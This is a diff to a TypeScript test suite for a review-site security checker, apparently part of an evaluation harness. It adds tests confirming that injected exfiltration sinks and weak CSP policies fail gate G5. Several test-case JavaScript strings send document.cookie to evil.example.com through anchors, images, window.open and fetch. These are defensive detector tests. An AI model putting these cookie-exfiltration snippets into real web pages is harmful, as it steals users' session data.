@@ -5,12 +5,12 @@ import { tmpdir } from "node:os";
 import { fileURLToPath } from "node:url";
 import { join } from "node:path";
 import { describe, it } from "node:test";
-import { checkReviewSite, type GateId, type ReviewSiteReport } from "./check.js";
+import { checkReviewSite, type Finding, type GateId, type ReviewSiteReport } from "./check.js";
 import { resolveArtifactRefs } from "../harness/provenance/index.js";
 
 const FIXTURE = fileURLToPath(new URL("../../validation/fixtures/review-site", import.meta.url));
 
-function gate(report: ReviewSiteReport, id: GateId): { ok: boolean; detail: string } {
+function gate(report: ReviewSiteReport, id: GateId): Finding {
   const f = report.findings.find((x) => x.gate === id);
   assert.ok(f, `report missing ${id}`);
   return f;
@@ -264,22 +264,26 @@ describe("check_review_site — one mutation per gate fails exactly that gate", 
     }
   });
 
-  it("G7: removing the export/schema surface fails G7", async () => {
+  it("G7 (F2 redefined): a manifest with no verdict_schema fails G7", async () => {
+    // G7 no longer requires an in-iframe export surface (that moved to the
+    // trusted shell; a download sink is now a G5 hard-fail). What it requires is
+    // the manifest naming the verdict_schema the shell will emit under.
     const { dir, cleanup } = await scratchFixture();
     try {
-      // Strip the export button from the page and the download+schema surface
-      // from the inline app script.
       await edit(dir, "index.html", (s) =>
-        s
-          .replace(/<button id="export-btn"[^>]*>[\s\S]*?<\/button>/, "")
-          .replace(/link\.download = "verdict\.json";/g, 'link.setAttribute("data-x", "1");')
-          .replace(/schema: manifest\.verdict_schema,/g, "kind: 1,"),
+        s.replace(/^\s*verdict_schema: "review-verdict\/1",\n/m, ""),
       );
       const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
       assert.equal(gate(report, "G7").ok, false, gate(report, "G7").detail);
+      assert.match(gate(report, "G7").detail, /verdict_schema/);
     } finally {
       await cleanup();
     }
+  });
+
+  it("G7 (F2): the clean fixture — which self-exports nothing — passes G7", async () => {
+    const report = await checkReviewSite({ siteDir: FIXTURE, cdnAllowlist: [] });
+    assert.equal(gate(report, "G7").ok, true, gate(report, "G7").detail);
   });
 
   it("G8: a produced_from hash / sample_id that does not match the run fails G8", async () => {
@@ -321,6 +325,154 @@ describe("check_review_site — one mutation per gate fails exactly that gate", 
     } finally {
       await cleanup();
     }
+  });
+});
+
+const CONNECT_SRC_NONE_CSP =
+  "default-src 'self'; script-src 'self' 'unsafe-inline'; connect-src 'none'; webrtc 'block'";
+
+describe("check_review_site — F3 dynamic-sink hard-fails (anchor/image/WebRTC/navigation)", () => {
+  // The exact classes CSP connect-src 'none' does NOT own. A malicious fixture
+  // that dynamically builds them must FAIL the gate even under a confirmed
+  // connect-src 'none' (which only downgrades the fetch/XHR class).
+  const CASES: ReadonlyArray<{ name: string; js: string; match: RegExp }> = [
+    {
+      name: "dynamic anchor + download + programmatic click",
+      js: 'var a = document.createElement("a"); a.href = "https://evil.example.com/?c=" + document.cookie; a.download = "x.json"; a.click();',
+      match: /download\/self-export sink/,
+    },
+    {
+      name: "new Image() exfil",
+      js: 'var i = new Image(); i.src = "https://evil.example.com/p?c=" + document.cookie;',
+      match: /dynamic image sink/,
+    },
+    {
+      name: 'document.createElement("img") exfil',
+      js: 'var i = document.createElement("img"); i.src = "https://evil.example.com/p";',
+      match: /dynamic image sink/,
+    },
+    {
+      name: "RTCPeerConnection data channel",
+      js: 'var pc = new RTCPeerConnection({ iceServers: [] });',
+      match: /WebRTC sink/,
+    },
+    {
+      name: "window.open navigation",
+      js: 'window.open("https://evil.example.com/?c=" + document.cookie);',
+      match: /navigation sink/,
+    },
+    {
+      name: "form.submit() navigation",
+      js: 'document.forms[0].submit();',
+      match: /navigation sink/,
+    },
+  ];
+
+  for (const c of CASES) {
+    it(`hard-fails G5 (even under connect-src 'none'): ${c.name}`, async () => {
+      const { dir, cleanup } = await scratchFixture();
+      try {
+        await edit(dir, "index.html", (s) => s.replace('"use strict";', `"use strict";\n  ${c.js}`));
+        const report = await checkReviewSite({
+          siteDir: dir,
+          cdnAllowlist: [],
+          contentSecurityPolicy: CONNECT_SRC_NONE_CSP,
+        });
+        assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
+        assert.match(gate(report, "G5").detail, c.match);
+        assert.equal(report.ok, false);
+      } finally {
+        await cleanup();
+      }
+    });
+  }
+});
+
+describe("check_review_site — F5 connect-src downgrade is narrow + fail-closed", () => {
+  async function fetchFixture(): Promise<{ dir: string; cleanup: () => Promise<void> }> {
+    const f = await scratchFixture();
+    await edit(f.dir, "index.html", (s) =>
+      s.replace('"use strict";', '"use strict";\n  fetch("https://evil.example.com/x?d=" + document.cookie);'),
+    );
+    return f;
+  }
+
+  it("a fetch is only a WARNING when the served CSP is exactly connect-src 'none'", async () => {
+    const { dir, cleanup } = await fetchFixture();
+    try {
+      const report = await checkReviewSite({
+        siteDir: dir,
+        cdnAllowlist: [],
+        contentSecurityPolicy: CONNECT_SRC_NONE_CSP,
+      });
+      assert.equal(gate(report, "G5").ok, true, gate(report, "G5").detail);
+      assert.match(String(gate(report, "G5").warnings), /fetch/);
+      assert.match(String(gate(report, "G5").warnings), /neutralized by served connect-src 'none'/);
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("FAIL CLOSED: the same fetch hard-fails when NO policy is supplied", async () => {
+    const { dir, cleanup } = await fetchFixture();
+    try {
+      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
+      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
+      assert.match(gate(report, "G5").detail, /fail-closed/);
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("FAIL CLOSED: the same fetch hard-fails under a WEAKER policy (connect-src 'self')", async () => {
+    const { dir, cleanup } = await fetchFixture();
+    try {
+      const report = await checkReviewSite({
+        siteDir: dir,
+        cdnAllowlist: [],
+        contentSecurityPolicy: "default-src 'self'; connect-src 'self'",
+      });
+      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("FAIL CLOSED: a MISSING connect-src directive (falls back to default-src) does not downgrade", async () => {
+    const { dir, cleanup } = await fetchFixture();
+    try {
+      const report = await checkReviewSite({
+        siteDir: dir,
+        cdnAllowlist: [],
+        contentSecurityPolicy: "default-src 'self'",
+      });
+      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
+    } finally {
+      await cleanup();
+    }
+  });
+});
+
+describe("check_review_site — the real inlined-three.js task-008 template passes the floor", () => {
+  const TASK_008 = fileURLToPath(
+    new URL("../../tasks/task-2026-07-10-008", import.meta.url),
+  );
+  it("all G-checks pass; the vendored three.js fetch is a warning, no download/nav sink remains", async () => {
+    const report = await checkReviewSite({
+      siteDir: join(TASK_008, "artifacts", "review-site"),
+      cdnAllowlist: [],
+      measurementsRoot: join(TASK_008, "artifacts"),
+      expectedSampleId: "task-2026-07-10-008",
+      requireFidelity: true,
+      contentSecurityPolicy: CONNECT_SRC_NONE_CSP,
+    });
+    for (const f of report.findings) {
+      assert.equal(f.ok, true, `${f.gate} should pass: ${f.detail}`);
+    }
+    assert.equal(report.ok, true);
+    assert.equal(report.fidelity, "verified");
+    // The only G5 hit is the dead vendored three.js loader fetch, downgraded.
+    assert.match(String(gate(report, "G5").warnings ?? ""), /fetch/);
   });
 });
 
